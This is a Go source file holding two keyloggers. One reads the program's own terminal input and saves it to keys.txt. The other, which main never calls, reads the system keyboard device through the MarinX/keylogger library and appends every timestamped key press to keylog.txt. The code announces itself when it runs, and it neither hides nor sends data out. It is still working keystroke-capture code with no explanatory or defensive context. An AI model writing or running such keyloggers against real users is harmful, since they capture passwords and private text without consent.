package main

import (
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/MarinX/keylogger"
	"github.com/mattn/go-tty"
)

func main() {
	keys, err := KLG1()
	if err != nil {
		log.Fatalf("Error occurred: %v", err)
	}
	fmt.Println("All pressed keys:", string(keys))
	os.WriteFile("keys.txt", []byte(string(keys)), 0644)
	fmt.Println("Terminated.")
}

func KLG1() ([]rune, error) {
	keyStore := []rune{}
	var mu sync.Mutex
	t, err := tty.Open()
	fmt.Println("Keylogger Activated.")
	if err != nil {
		return nil, err
	}
	defer t.Close()
	for {
		mu.Lock()
		char, err := t.ReadRune()
		if err != nil {
			mu.Unlock()
			return nil, err
		}
		fmt.Printf("You pressed: %c (Unicode: %d)\n", char, char)
		keyStore = append(keyStore, char)
		mu.Unlock()
		if char == 27 {
			fmt.Println("Exiting...")
			break
		}
	}
	return keyStore, nil
}

func KLG2() {
	keyboard := keylogger.FindKeyboardDevice()
	logFile, err := os.OpenFile("keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Error opening log file: ", err)
	}
	defer logFile.Close()

	logger, er := keylogger.New(keyboard)
	if er != nil {
		log.Fatal("Error initializing keyboard.", er)
	}
	defer logger.Close()

	fmt.Println("Keylogger started. Press keys to record. Press Ctrl+C to stop.")

	for event := range logger.Read() {
		if event.Type == keylogger.EvKey && event.KeyPress() {
			logEntry := fmt.Sprintf("%s: %s\n", time.Now().Format("2006-01-02 15:04:05"), event.KeyString())
			fmt.Print(logEntry)
			logFile.WriteString(logEntry)
		}
	}
}
